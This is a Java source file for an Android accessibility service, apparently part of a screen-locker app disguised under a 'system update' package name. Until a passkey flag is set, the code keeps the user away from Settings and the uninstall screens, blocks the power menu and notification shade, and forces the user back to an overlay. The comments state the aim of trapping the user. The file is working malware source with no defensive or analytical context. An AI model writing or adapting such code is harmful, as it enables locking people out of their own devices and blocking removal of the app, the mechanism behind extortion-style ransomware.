package com.system.updatex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class KioskAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // CHECK THE FLAG FIRST
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE)
                .getBoolean("is_unlocked", false);
        
        // IF THE USER ENTERED THE PASSKEY, DO NOTHING
        if (isUnlocked) return;

        if (event == null || event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        
        CharSequence packageName = event.getPackageName();
        if (packageName == null) return;
        
        String foregroundPackage = packageName.toString();
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // Block Settings and Package Installer (Uninstall screens)
        if (foregroundPackage.contains("settings") || foregroundPackage.contains("packageinstaller")) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            Intent intent = new Intent(this, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            return;
        }

        // Block Power Menu and Notification Shade
        if (foregroundPackage.contains("systemui")) {
            if (className.contains("GlobalActions") || className.contains("NotificationShade")) {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                return;
            }
        }

        // Trap User in the Overlay
        boolean isAllowed = foregroundPackage.equals("com.system.updatex") 
                || foregroundPackage.contains("launcher") 
                || foregroundPackage.contains("systemui");

        if (!isAllowed) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            Intent intent = new Intent(this, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
    @Override
    public void onInterrupt() {}
}
